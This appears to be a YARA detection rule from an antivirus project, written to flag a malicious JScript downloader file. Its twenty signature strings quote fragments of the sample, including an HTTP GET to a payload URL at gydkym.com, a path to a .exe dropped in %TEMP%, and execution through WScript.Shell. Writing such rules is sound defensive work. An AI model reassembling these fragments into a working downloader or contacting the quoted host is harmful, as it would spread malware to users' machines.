rule sig_20160328_aea86ce7a3146caf6a12c8d07a20d8de {
  meta:
    description = "datamaliciousorder - file 20160328_aea86ce7a3146caf6a12c8d07a20d8de.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0b6333b7658d7f644a60df42974269b4f09c999d4bcb1adf8fd397f4c87f411a"

  strings:
    $s1  = "function Tzkwgth() {return Vnakf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"UBW29nRQbaR.exe\";};" fullword ascii
    $s2  = "Igwjvyrax[Srvmfsl](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Wyuypq](Qthzqa() * 11)} while (Igwjvyrax[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Rmeqzwzl(Ywdbvbhuf, Tilgc){return Ywdbvbhuf - Tilgc;};" fullword ascii
    $s5  = "var Vnakf = function Oguanbmx() {return WScript[Hymqkffqk](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Qqfrwbadzi(Xabqzufhz){Vnakf[\"Run\"](Xabqzufhz, Xdfsmxx, Xdfsmxx);};" fullword ascii
    $s7  = "function Igwbyccjk() {return ((Vustbq == true) && (Vustbq == Grslfmdlw)) ? 1 : Xdfsmxx;};" fullword ascii
    $s8  = "Grslfmdlw = true; " fullword ascii
    $s9  = "var Vustbq = false;" fullword ascii
    $s10 = "function Pshyip()" fullword ascii
    $s11 = " while (Uzkypcpb){" fullword ascii
    $s12 = "return Rmeqzwzl(Yydvnocdk, Phlabbm);" fullword ascii
    $s13 = "function Dfzfjflp(){return Hymqkffqk;};" fullword ascii
    $s14 = "var Uvzpaifzdm = false;" fullword ascii
    $s15 = "Vustbq = true; " fullword ascii
    $s16 = "function Qthzqa(){return 22;};" fullword ascii
    $s17 = "function Rgsycvqc(Nreryoj) {var Wmrjmd = (1, 2, 3, 4, 5, Nreryoj); return Wmrjmd;};" fullword ascii
    $s18 = "function Puimuegntn(){return Shxfegxelf;};" fullword ascii
    $s19 = "var Ynamily = new this[\"Date\"]();" fullword ascii
    $s20 = "var Grslfmdlw = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}